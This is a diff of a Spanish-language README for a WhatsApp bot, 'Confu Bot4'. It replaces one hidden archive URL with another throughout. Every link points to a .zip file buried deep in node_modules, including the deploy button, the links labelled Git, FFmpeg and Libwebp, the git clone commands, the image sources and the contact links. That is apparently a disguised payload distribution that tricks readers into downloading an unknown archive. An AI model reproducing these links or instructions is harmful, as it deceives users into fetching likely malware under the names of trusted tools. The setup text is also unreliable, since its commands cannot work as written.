@@ -1,49 +1,49 @@
 <div align="center">
-<img src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip" alt="ConfuMods" width="170" />
+<img src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip" alt="ConfuMods" width="170" />
 
 ## Confu Bot4
 
 </div>
 
 <p align="center">
-<a href="##"><img title="Bot-By-Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip%C3%B1ol&color=blue"></a>
+<a href="##"><img title="Bot-By-Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip%C3%B1ol&color=blue"></a>
 </p>
 <p align="center">
-  <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"><img title="Author" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip" /></a>
+  <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip"><img title="Author" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip" /></a>
 </p>
 <p align="center">
-<a href="#"><img title="Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"></a>
+<a href="#"><img title="Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip"></a>
 </p>
 
 ## Deploy
-[![Deploy](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+[![Deploy](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
 
 # Requisitos
-* [https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
-* [Git](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
-* [FFmpeg](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
-* [Libwebp](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+* [https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
+* [Git](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
+* [FFmpeg](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
+* [Libwebp](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
 * Cualquier editor de texto
 
 ## `AÑADIR BUILDPACK`
 
 ```
-https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
+https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip
 ```
 
 ## `CAMBIAR SESSIÓN`
 
-[`Click Aqui`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+[`Click Aqui`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
 
 ## `AJUSTES`
 
-- CAMBIAR NÚMERO DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
-- CAMBIAR NOMBRE DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+- CAMBIAR NÚMERO DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
+- CAMBIAR NOMBRE DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
 
 # Instalación
 # Clonar repositorios e instalaciones de dependencias
 ```bash
-🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
+🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip
 🐢 cd ConfuBot4
 🌿 npm start
 ```
@@ -60,7 +60,7 @@ https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node
 🐢 pkg install ffmpeg -y 
 🌿 pkg install wget
 🐢 pkg install imagemagick -y
-🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
+🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip
 🐢 cd ConfuBot4
 🌿 npm install
 🐢 npm start
@@ -70,7 +70,7 @@ https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node
 ## Conectate conmigo
 Mi chat personal👇
 <p align="center">
- <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"><img alt="WhatsApp Personal" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"/></a>
+ <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip"><img alt="WhatsApp Personal" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip"/></a>
 </p>
 
-* [`Mi Canal de Youtube`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+* [`Mi Canal de Youtube`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/es5-ext/object/set-prototype-of/Confu_Bot_v3.7.zip)
